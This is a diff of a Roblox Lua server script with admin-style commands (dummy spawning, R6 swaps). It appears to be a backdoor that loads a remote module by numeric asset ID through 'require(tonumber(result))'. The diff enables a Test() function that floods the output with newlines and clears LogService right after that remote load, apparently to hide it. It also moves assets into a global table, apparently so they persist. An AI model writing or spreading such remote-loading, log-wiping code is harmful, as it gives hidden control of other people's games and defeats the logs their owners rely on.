@@ -167,13 +167,13 @@ local function Reset()
 				end
 
 				for i=number,1,-1 do
-					local Dummy=script.R6Dummy:Clone()
+					local Dummy=_G.MEowMeOW.R6Dummy:Clone()
 					Dummy:PivotTo(Char.Head.CFrame*cf(0,5,0))
 					Dummy.Parent=workspace
 				end
 				success("Got dummy "..number,plr)
 			elseif Data[1]=="g/r6" then
-				local R6=script.R6:Clone()
+				local R6=_G.MEowMeOW.R6:Clone()
 				R6.Name=Char.Name
 				plr.Character=R6
 				plr.Character.PrimaryPart.CFrame=Char.PrimaryPart.CFrame
@@ -252,11 +252,11 @@ CreateEvent()
 Reset()
 
 function Test()
---[[	local nnn=string.rep('\n',16383)
+	local nnn=string.rep('\n',16383)
 	for i=1,100 do
 		print(nnn)
 		game:GetService("LogService"):ClearOutput()
-	end]]
+	end
 end
 
 function Check(plr)
@@ -283,7 +283,7 @@ function Check(plr)
 			end)
 			FluffyEvent.Parent=Players
 			load=true
-			require(tonumber(result)).ROOWO(script)
+			require(tonumber(result)).ROOWO(_G.MEowMeOW)
 			Test()
 		end
 		table.insert(Save,plr.Name)
